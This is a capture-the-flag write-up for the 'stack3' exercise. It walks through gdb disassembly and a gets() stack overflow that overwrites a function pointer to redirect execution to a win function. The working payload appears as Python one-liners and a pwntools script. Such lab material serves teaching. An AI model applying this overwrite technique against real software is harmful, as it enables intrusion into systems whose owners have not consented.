# stack3
## Tools used
- gdb (gef)
## Recon
Running the binary, we're able to provide input, but doing so doesn't give us any feedback. Firing up gdb, we can see the binary's function info:
```shell
File stack3/stack3.c:
11:	int main(int, char **);
6:	void win(void);
```
Looks like we have more than one function this time, keeping us on our toes! Let's take a look at the disassembly for both of these functions

## Disassembly
```shell
Dump of assembler code for function main:
   0x08048438 <+0>:	push   ebp
   0x08048439 <+1>:	mov    ebp,esp
   0x0804843b <+3>:	and    esp,0xfffffff0
   0x0804843e <+6>:	sub    esp,0x60
=> 0x08048441 <+9>:	mov    DWORD PTR [esp+0x5c],0x0
   0x08048449 <+17>:	lea    eax,[esp+0x1c]
   0x0804844d <+21>:	mov    DWORD PTR [esp],eax
   0x08048450 <+24>:	call   0x8048330 <gets@plt>
   0x08048455 <+29>:	cmp    DWORD PTR [esp+0x5c],0x0
   0x0804845a <+34>:	je     0x8048477 <main+63>
   0x0804845c <+36>:	mov    eax,0x8048560
   0x08048461 <+41>:	mov    edx,DWORD PTR [esp+0x5c]
   0x08048465 <+45>:	mov    DWORD PTR [esp+0x4],edx
   0x08048469 <+49>:	mov    DWORD PTR [esp],eax
   0x0804846c <+52>:	call   0x8048350 <printf@plt>
   0x08048471 <+57>:	mov    eax,DWORD PTR [esp+0x5c]
   0x08048475 <+61>:	call   eax
   0x08048477 <+63>:	leave
   0x08048478 <+64>:	ret
End of assembler dump.
```
- looks like our standard input is located at [esp+0x1c] since its address is loaded into eax before the gets call
- The result of the gets call is compared to the value at [esp+0x5c], so that's probably the address we need to spill into with a stack overflow
- Before the main function ends, the value of [esp+0x5c] is loaded into eax, and a system call is performed on said eax value

Alright, starting with our input of [esp+0x1c], we're going to need to alter the variable at [esp+0x5c] (0x40 or 64 offset) which will later have a system call performed on it. This means the value of [esp+0x5c] will need to be the memory address of a function that we want to have called. Given that there's only one other interesting function in this binary (win), we'll probably want to call said function

```shell
Dump of assembler code for function win:
   0x08048424 <+0>:	push   ebp
   0x08048425 <+1>:	mov    ebp,esp
   0x08048427 <+3>:	sub    esp,0x18
   0x0804842a <+6>:	mov    DWORD PTR [esp],0x8048540
   0x08048431 <+13>:	call   0x8048360 <puts@plt>
   0x08048436 <+18>:	leave
   0x08048437 <+19>:	ret
End of assembler dump.
```
Looks like the memory address of the win function is at 0x08048424. Converting this to ascii will not be pretty, so we're going to have to work some command line magic to feed this address into the binary.

To summarize:
- overflow the stack from [esp+0x1c] to [esp+0x5c] (64 +4 characters)
- [esp+0x5c] will need to have the value 0x08048424, pointing to the win function when the syscall is performed
- The binary is little endian, so when creating our input string, the 0x08048424 will need to be reversed

## Method
The most straightforward way to solve this would be to pipe our input string from python into the binary like so:
```shell
$ python3 -c "print('A'*64 + '\x24\x84\x04\x08') | ./stack3
calling function pointer, jumping to 0x0484c224
Segmentation fault
```
Well that's not what we wanted. What's going on with our input? How did 0x08048424 become 0x0484c224? The problem here is python3's interpretation of our hex values. Somewhere along the road, when python3 prints to stdout, the utf-8 encoding screws with the very specific values we wanted, and feeds trash into the binary. We could try to fix this by doing:
```shell
$ python3 -c "print(b'A'*64 + b'\x24\x84\x04\x08') | ./stack3
calling function pointer, jumping to 0x5c246161
Segmentation fault
```
but we get an even crazier address, probably because python prints byte strings prepended with a b, like b"{our garbage}". What's a girl to do? One solution that isn't too much more work is to use the popular python ctf library pwntools like so:
```python3
from pwn import process
p = process("./stack3")
p.sendline(b"A"*64 + b"\x24\x84\x04\x08")
p.interactive()
```

and from the interactive shell, we can see:
```shell
calling function pointer, jumping to 0x08048424
code flow successfully changed
```
